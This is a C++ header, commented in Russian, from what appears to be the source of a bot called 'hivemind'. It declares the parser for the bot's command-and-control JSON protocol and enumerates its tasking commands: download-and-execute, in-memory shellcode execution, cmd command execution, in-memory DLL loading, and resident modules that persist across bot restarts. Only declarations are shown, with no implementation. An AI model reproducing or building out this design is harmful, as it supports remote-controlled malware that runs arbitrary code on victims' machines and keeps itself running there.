#pragma once

#include "global.hpp"
#include "utils.hpp"
#include "strings.hpp"

#define CIDFIELD_MAXLEN_CHARS 512

class IProtocolParser
{
public:
	virtual ~IProtocolParser() = default;
	// lpProtocol - данные для десериализации 
	// dwProtocolDataSize - размер данных для десериализации
	virtual BOOL deserialize(LPBYTE lpProtocol, SIZE_T dwProtocolDataSize) = 0;
	virtual blob *get_result() = 0;
};

// тип команды, используется в OPERATION_TYPE_COMMAND
typedef enum _hivemind_command_type
{
	COMMAND_DOWNLOADEXEC, // скачать EXE и запустить
	COMMAND_SHELLCODE, // загрузить в память и запустить шеллкод
	COMMAND_CMDEXEC, // исполнить команду в cmd
	COMMAND_DLLLOADER, // загрузить DLL в память
	COMMAND_UNKNOWN
} hivemind_command_type_t;

// тип модуля, ипользуется в OPERATION_TYPE_MODULE
typedef enum _hivemind_module_type
{
	MODULE_RESIDENT, // модуль нужно записать в vfs для запуска при каждом старте бота
	MODULE_NONRESIDENT, // модуль только в памяти, никуда записывать не надо
	MODULE_UNKNOWN
} hivemind_module_type_t;


// тип операции
typedef enum _hivemind_op_type
{
	OPERATION_TYPE_COMMAND, // исполнить команду
	OPERATION_TYPE_MODULE, // загрузить модуль
	OPERATION_TYPE_IGNORE_UNKNOWN // неизвестная операция - игнорим
} hivemind_op_type_t;


// десериалайз операции
// !!!! ВАЖНО !!!! в диспатчере команд скопировать data и cid в отдельный буфер, так как эта структура не long-live и освобождается в деструкторе, а также при следующем парсинге
struct hivemind_operation_data
{
	hivemind_op_type_t hmOperationType; // тип операции
	union additional_type // операция либо модуль либо команда
	{
		hivemind_module_type_t hmModuleType; // тип модуля
		hivemind_command_type_t hmCommandType; // тип команды
	} additional;
	blob data; // данные
	blob cid; // command id
};

class ProtocolJsonParser : public IProtocolParser
{
public:
	ProtocolJsonParser();
	~ProtocolJsonParser();

	// lpProtocol - json строка в ansi
	// dwProtocolDataSize - размер char строки + нулевой символ
	BOOL deserialize(LPBYTE lpProtocol, SIZE_T dwProtocolDataSize);
	blob *get_result();
	// освобождает hmOperationsArray
	VOID free(); 
protected:
	// считает количество "op"
	UINT get_operation_count(PCHAR pchProtocol, jfes_token_t *tokens, jfes_size_t tokamount);
	// декодирует json строку в массив hivemind_operation_data
	BOOL decode(PCHAR pchProtocol, jfes_token_t *tokens, jfes_size_t tokamount, UINT uOperationsAmount);
private:
	// указатель на массив hivemind_operation_data - по каждому элементу на каждую операцию
	blob hmOperationsArray;
	// освободит и занулит поинтер через delete[]
	VOID free_ptr(LPBYTE *lpBuffer);

#ifdef _DEBUG
	VOID WriteLog_print();
	// WriteConsole если задан _DEBUG_CHANNEL и WriteLog если просто дебаг
	VOID co_printf(PCHAR pchPrint);
#endif
};